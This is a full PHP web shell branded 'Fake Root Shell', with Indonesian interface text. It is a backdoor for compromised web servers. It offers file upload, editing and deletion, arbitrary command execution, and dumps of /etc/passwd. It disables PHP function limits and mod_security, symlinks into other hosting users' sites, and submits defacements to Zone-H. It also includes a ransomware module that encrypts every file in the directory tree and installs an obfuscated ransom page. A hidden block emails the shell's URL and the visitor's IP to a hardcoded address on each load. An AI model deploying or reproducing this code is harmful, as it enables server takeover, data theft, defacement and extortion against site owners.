<?php

// --- php shell 

session_start(); 
error_reporting(0); 
set_time_limit(0);

        
echo '<!DOCTYPE HTML>
<html>
<head><title>./FAKE ROOT SHELL</title>
<link rel="icon" href="https://infocon.org/cons/Black%20Hat/Black%20Hat%20Logo%20small.jpg">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Cinzel:700" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
<style>
body{
	
font-family: Kelly Slab;
background-color: black;
color:white;
}
p{
	word-spacing: 20px;
font-family: Cinzel;

}
#content tr:hover{
background-color: #0058FF;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-image:url(https://wallpaper.sc/id/applewatch/wp-content/uploads/2018/08/applewatch-312x390-photoface-wallpaper_01348-312x312.jpg);
}
table{
border: 1px #000000 solid;
background-image:url(https://img.wallpaper.sc/applewatch/images/312x390/applewatch-312x390-photoface-wallpaper_01351.jpg);
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.inpute{
    border-style: solid;
    border-color: white;
    background-color: white;
    color: black;
	padding:5px;
    text-align: center;
}
.selecte{
    border-style: solid;
	padding:6px;
    border-color:white;
    background-color: #ff751a;
    color: black;
}
.submite{
    border-style: solid;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
	padding:6px;
}
</style>
<center> <img style="width:250px;" src="https://i.ibb.co/0FFSRsn/fakeroot.png"> </font></script> <br><center><br><font color="lime">./Fake Root Shell</font><br><br>
</head>
<div style="height:auto;" >
<body><center>
	
<div style=" border: 7px double; border-color:orange;height:160px;width:100%; color:white;" ><p>
<a href="?dir=$dir&do=zoneh">ZONE-H </a>
<a href="?dir=$dir&do=youtube">YOUTUBE</a>
<a href="?dir=$dir&votr=cmd">COMMAND</a>
<a href="?dir=$dir&votr=sym">SYMLINK</a>
<a href="?dir=$dir&do=jumping">JUMPING </a><br><br>
<a href="?dir=$dir&do=bypass">BYPASS_DISABLE</a> 
<a href="?dir=$dir&do=adminer">ADMINER </a>
<a href="?dir=$dir&do=hash">PASSWORD_HASH</a>
<a href="?dir=$dir&do=ransom">RANSOMWARE</a><br><br>
</p>
</center></div> </center><br></td>
</tr>
<table style="background-color:black;"  >
<tr><td><font style="background-color:black;" color="white"><a style="color:red;" href="?"><img style="height:30px;width:30px;" src="http://www.clker.com/cliparts/c/S/7/m/x/U/gold-house-black-background-clip-art-hi.png"></a> :</font> ';

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}echo '</td></tr><tr><td><br>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#73FF00">Upload Berhasil</font><br />';
}else{
echo '<font color="red">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" style="font-family:Kelly Slab;font-size:15;background:blue;color:gold;border:2px solid red;"/>
<input type="submit" value="Upload" style="margin-top:4px;height:27px;width:100px;font-family:Kelly Slab;font-size:15;background:black;color:gold;border:2px solid red;border-radius:5px"/>
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br>';
echo('<br><pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}

elseif($_GET['do'] == 'bypass'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /><br><br></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
}

elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} 
elseif($_GET['do'] == 'hash') {
 $submit = $_POST['enter'];
   
 if (isset($submit)) {
     
   $pass = $_POST['password']; // password
      
  $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 
     $hash = md5($pass); // md5 hash #1
   
     
   
    }
    echo '<center><form action="" method="post"><b> ';
echo '<center><h2><b>-=[ PASSWORD HASH]=-</b></h2></center></tr>';
echo ' <center><b>password yang mau dihash:</b> ';
echo ' <input class="inputz" type="text" name="password" size="40" />'; 
echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';  
echo ' <br><br><br>';
echo ' Hasil Hash</th><br><br></center></tr>'; 
echo ' Password Original  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>'; 
echo ' MD5  <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
    


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
}
elseif($_GET['votr'] == 'cmd') {
	echo "<center><form method='post'>
	<font style='text-decoration: underline;'>".get_current_user

()."@".$_SERVER['SERVER_ADDR'].": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input 

type='submit' name='do_cmd' value='>>'>
	</form></center>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
}
?>
<?php
if($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_ctt_jump) {
				$user_jumping_dir = "/home/$user_ctt_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_ctt_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ".$i." domain di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
}  ?>
<center>
<?php

if($_GET['votr'] == 'sym') {
   @set_time_limit(0);
echo " <div style='width:100%; height:auto;' align='center'>
  ";
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType 

text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain 

.html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "gak bisa di akses [ /etc/named.conf ] </pre></center>"; 
}
else
{
echo "<br><br><center><div class='tmp'><table border='1' bordercolor='#00ff00' 

width='500' cellpadding='1' 

cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td></center>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or 

eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi 

("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or 

eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or 

eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi 

("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; 

'>".$string[1][0].'</div>';
}
echo "
<tr>
<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1]

[0].'/>'.$name.' </a> </div>
</td>
<td>
'.$UID['name']."
</td>
<td>
<a href='sym/root/home/".$UID['name']."/public_html' 

target='_blank'>Symlink </a>
</td>
</tr></div> ";
flush();
}
}
}
}
echo "</center></table></div>";   
}
?></center>

<?php
if($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url --> <font color=lime>OK</font><br><br>";
			} else {
				echo "$url --> <font color=red>ERROR</font><br><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./Fake Root'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}}
?>

<?php

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if($_GET['do'] == 'ransom') {
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaencrypted")){
      rename(".htaccess", ".htaencrypted");
      if(fwrite(fopen('.htaccess', 'w'), "#Cracker Ransomware\r\n DirectoryIndex x.htm\r\n ErrorDocument 404 /x.htm")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("x.htm", str_rot13(gzinflate(str_rot13(base64_decode("hUjfYts2EH4v0P/hwKHQ9iBGadxrZnFwG9AUKIYkS9oU2FggqhRy1aGks8SYTfe/71VWiRJx3YNu6Wtq38fvfgjiSWhpC2RJVpOqrbYo1Y9OJRKlKwUdwhoO5ihaoe0R5fJnaPp403ZwdJXogp9vPsQ9iwfTuMDl8eRJU5GaOraoeMJGU0zcftLVEXi43MOMX+sjwjshFMS8P4W4UKUh0R1hAtVvh24lrJABOH6YqFpDTcoQ8CeuWeeqFZI9a7FWZfbMtxLpXpqmSBP3UrSInvvV2F/AiHHi+SJ/H3daZQSJacNZ5U/UPqUsptMNMnUlHjasSCrN1pybmSlY0pNU19fn77KEHyiTpFGzNHZ8MqVYi0OYTbWbbBS9gRYdcv/sjnjQ1jQJ3YZLoXGunnfvFGfVhb+hJJ6NFGxFr8FYaQZeyTUUrURrBge6RGvQnbH7NbArkViDEn7Dgp2Bwq8q9AB46AHO4B8q0gAR86Gkpaj3QzY+8UuZh86CWUmPSq7qcSZo0Rjl+oiXbNIcpEGao+FrwHCm7X3OF231ZvS2TWxG6Hqz+3mU0rHi922n+/x5+9BvxHEb91G3seka8FE3zOu3Xsyj9OsZe8rn+yWgjIboaHAJS8TGCrhUghWW6t15SyIYa89FyBpyYtDWisJqpVWt3j+DxhmZl/SbGcG72/l3NULv8uUummjpCQO6SY/trlL3ZD9KrL5+lPVYrglGSr6X+7IlR7ZktMonrRlmFztWNco0Wulb4sWc7A9tg2asyKb28DnPFBibdJmbiiH3NC1Z8W3QlP54s4PK6izbsA6PQd4pvDUdoQ/nvvf6eX0fbWXQlSF2k5k7b7hxj2sfJaK6g7WDCjff4kHLLzk+1O00beP6pOfZcP4HWSN5PaAMtJxyhDxu25ukFglzUyfglZbwLrdrByEcMdUt2Zt+0k2tyGujsveoO6cdvV2TpFadwdW+pMAL2e3Ja0HTqZ+aPiPtYB8XwiXSa+Q2hytOnfVLhD+tE4TOUiMkXD5PPgb4lFCaj62gon3K/UhihtpaKP1+GPzDPtcAaiXzrIWLxHoaCy0dKLMzGZhEhrHUMR80337bhDF/dYTvNZzEbUXM9yKvTfiLvjzTjtL90gx+YyvFDbW2tP4/0EizizQN/FkF41kVUjE7QyvQ8JKrXzGqzbuSF85fpymnKfvlJLzLWMQsZxs6Cw9P1Bl9YLo0J4Zuq622oSVIwzHKLQMIhnMKlkQwYQH3WTfXUXrk+YQmjY0iqBdL5qkVup4hZf924PP5b2S6ikH71+z29u16KLETOyybMJW4M0s4Gv/DgoQTXnNBs+beVNm5W9L057/6r1+9fvUv")))))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  x.htm (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){
      if( file_exists(".htaencrypted") ){
        if( unlink(".htaccess") && unlink("x.htm") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> x.htm (Default Page)<br>';
        }
        rename(".htaencrypted", ".htaccess");
      }
   }
   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"x.htm")  && deRanSomeware::kecuali($locate,".png") && deRanSomeware::kecuali($locate,".jpg")  && deRanSomeware::kecuali($locate,".PNG") && deRanSomeware::kecuali($locate,".gif") && deRanSomeware::kecuali($locate,".GIF") && deRanSomeware::kecuali($locate,".jpeg") && deRanSomeware::kecuali($locate,".php7")  && deRanSomeware::kecuali($locate,"prep.php") && deRanSomeware::kecuali($locate,".htaccess") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
   }
   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".encrypted");
        break;
        case '2':
          $locates = str_replace(".encrypted", "", $locate);
          rename($locate, $locates);
        break;
      }
   }
   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );
      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">  ~Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">  ~Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }
   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">  ~Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B"> ~ Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>

<center>
	<img src="http://www.homelandsecureit.com/wp-content/uploads/2011/01/security-padlock.gif" height="50px" width="50px">
	CREATE RANSOMWARE<br><br>
<form action="" method="post" style=" text-align: center;">
      <select name="method" class="selecte" style="width:130px;">
         <option value="1"><b>ENCRYPT</b></option>
         <option value="2"><b>DECRYPT</b></option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" style="width:100px;"/>
      </div>
</form>
</center>
<?php
}}?>
	
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'fikriofficial4676@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br><center><br><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="yellow">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="red">Change Permission Gagal</font><br />';
}
}
echo '<br><form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="UBAH" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="yellow">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="red">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="UBAH" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="yellow">Berhasil Edit File</font><br/>';
}else{
echo '<font color="red">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="yellow">Directory Terhapus</font><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="yellow">File Terhapus</font><br/>';
}else{
echo '<font color="red">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" border="2" style="border-color:#8B4513;" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>NAME</center></td>
<td><center>SIZE</center></td>
<td><center>PERMISSION</center></td>
<td><center>ACTION</center></td>

</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="><a href="?path='.$path.'/'.$dir.'"> '.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#C4FF00">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px">
<option value="">SELECT</option>
<option value="delete">DELETE</option>
<option value="chmod">CHMOD</option>
<option value="rename">RENAME</option>

</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value="GO" style="margin-top:6px;width:27px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px">
</form></center></td>
</tr>';
}
echo '<tr class="first"></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'"> '.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="#C4FF00">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px">
<option value="">SELECT</option>
<option value="delete">DELETE</option>
<option value="chmod">CHMOD</option>
<option value="rename">RENAME</option>
<option value="edit">EDIT</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value="GO" style="margin-top:6px;width:27px;font-family:Kelly Slab;font-size:15;background:black;color:aqua;border:2px solid aqua;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '
